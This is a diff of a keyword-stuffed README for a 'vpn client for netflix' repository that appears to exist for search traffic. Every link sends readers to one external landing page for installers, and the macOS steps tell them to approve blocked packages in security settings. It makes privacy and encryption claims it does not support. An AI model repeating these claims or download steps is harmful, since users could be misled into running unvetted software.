@@ -1,78 +1,79 @@
 # ⚡ vpn client for netflix
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest-blue)](https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-2ea44f)
-![License](https://img.shields.io/badge/License-MIT-black)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-111827?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/)
+[![License](https://img.shields.io/badge/License-MIT-16a34a?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/)
 
 ## About
 
-**vpn client for netflix** is a privacy-first VPN client built for streaming without the usual buffering, random disconnects, or mystery routing. It focuses on **high speed**, **stable connection**, and a clean UX that gets you connected fast.
+This repo documents a **vpn client for netflix** built for people who want a clean client, stable routing, and strict privacy defaults. It focuses on the stuff that matters in day-to-day use: quick connect, reliable servers, and a kill switch that actually stops leaks when your network drops.
 
 Repository: https://github.com/fastvpnmyjob2026-prog/vpn-client-for-netflix-seo  
-Main page & downloads: https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/
+Get the app & builds: https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/
 
 ## Features
 
-- **High speed + stable connection** tuned for streaming sessions
-- **AES-256 encryption** for traffic protection on any network
-- **No-Logs policy** to keep usage private
-- **Kill Switch** to prevent leaks if the tunnel drops
-- **Global Servers** to route through multiple regions
-- Quick connect + recent locations
-- DNS leak protection and clean reconnect behavior
+- **AES-256 encryption** end-to-end
+- **No-Logs policy** (privacy and security focus)
+- **Kill Switch** to block traffic if the tunnel fails
+- **Global Servers** with fast region switching
+- **High speed** profiles for streaming
+- **Stable connection** with reconnect handling
+- DNS + IP leak protection defaults (no extra toggles required)
+- Simple server list: search, favorites, last used
 
 ## System Requirements
 
-| Requirement | Minimum |
+| Item | Minimum |
 |---|---|
 | Windows | Windows 10/11 (64-bit) |
 | macOS | macOS 12+ |
-| Linux | Ubuntu 20.04+/Debian 11+/Fedora 36+ |
+| Linux | Ubuntu 20.04+ / Debian 11+ (64-bit) |
 | RAM | 2 GB (4 GB recommended) |
-| Storage | 200 MB free space |
-| Internet | 5+ Mbps (wired or strong Wi‑Fi recommended) |
+| Storage | 250 MB free |
+| Internet | Broadband connection (wired or stable Wi‑Fi) |
 
 ## Installation
 
-> All installers and current build notes live on the landing page:  
-> https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/
+> Install from the landing page builds. Keep auto-updates on unless you pin versions.
 
 ### Windows
-1. Download the Windows installer from: https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/
-2. Run the installer (`.exe`) and finish setup.
-3. Open the app → sign in → **Quick Connect** or pick a region.
+1. Download the latest installer from: https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/
+2. Run the installer.
+3. Launch the client → **Sign in** → **Quick Connect** (or pick a region).
 
 ### macOS
 1. Download the macOS package from: https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/
-2. Open the installer (`.dmg`/`.pkg`) and move the app to Applications if prompted.
-3. Launch → approve VPN permissions → connect.
+2. Open the package and approve the prompt in **System Settings → Privacy & Security** if macOS blocks it.
+3. Start the app → connect to a server close to you for best speed.
 
 ### Linux
 1. Download the Linux build from: https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/
-2. Install using your distro method (deb/rpm) or run the provided launcher.
-3. Start the client → sign in → connect to a region.
+2. Install using your distro method (package manager or direct install).
+3. Launch the client and connect.
+4. Optional: enable the **Kill Switch** before long sessions.
 
 ## Comparison
 
-| Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
+| Client | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|:---:|:---:|:---:|:---:|
-| **vpn client for netflix** | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical free VPN | Low / throttled | ⚠️ | ❌ | ❌ | ⚠️ |
-| Basic proxy/DNS | Medium | ❌ | ❌ | ❌ | ⚠️ |
+| This vpn client for netflix | High speed | ✅ | ✅ | ✅ | ✅ |
+| Typical free VPN | Low / inconsistent | ⚠️ | ❌ | ❌ | ⚠️ |
+| Basic proxy / DNS switcher | Medium | ❌ | ⚠️ | ❌ | ❌ |
 
 ## FAQ
 
-**Q: Does this include a Kill Switch?**  
-A: Yes. Turn it on in settings to block traffic if the VPN drops.
+**Does this vpn client for netflix keep logs?**  
+No. It follows a **No-Logs policy**.
 
-**Q: What encryption does it use?**  
-A: **AES-256 encryption**.
+**Is there a kill switch?**  
+Yes. The **Kill Switch** blocks traffic if the VPN disconnects, reducing leak risk.
 
-**Q: Is there a No-Logs policy?**  
-A: Yes. The client is built around a **No-Logs policy** mindset.
+**Which server should I pick for best speed?**  
+Start with the closest region. Shorter distance usually means lower latency and better throughput.
 
-**Q: Which platform should I install on first?**  
-A: Start with your main streaming device. Windows/macOS is quickest to set up; Linux works well if you want fine control.
+**Will it work on all my devices?**  
+Windows, macOS, and Linux are supported. Use the same account across devices based on your plan.
 
 ## Download
 
@@ -81,8 +82,8 @@ Get the latest build here:
 
 ## Final CTA
 
-[![Download Now](https://img.shields.io/badge/Download-Open%20Landing%20Page-blue?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/)
-[![Get Started](https://img.shields.io/badge/Get%20Started-Connect%20Now-2ea44f?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/)
-[![Repo](https://img.shields.io/badge/GitHub-Repository-black?style=for-the-badge)](https://github.com/fastvpnmyjob2026-prog/vpn-client-for-netflix-seo)
+[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-blue?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/)
+[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-111827?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/vpn-client-for-netflix-landing/)
+[![View Repo](https://img.shields.io/badge/View-GitHub%20Repo-16a34a?style=for-the-badge)](https://github.com/fastvpnmyjob2026-prog/vpn-client-for-netflix-seo)
 
-*Fast setup, clean defaults, and the controls you actually need.*
+*Use a VPN responsibly and follow local laws and service terms.*
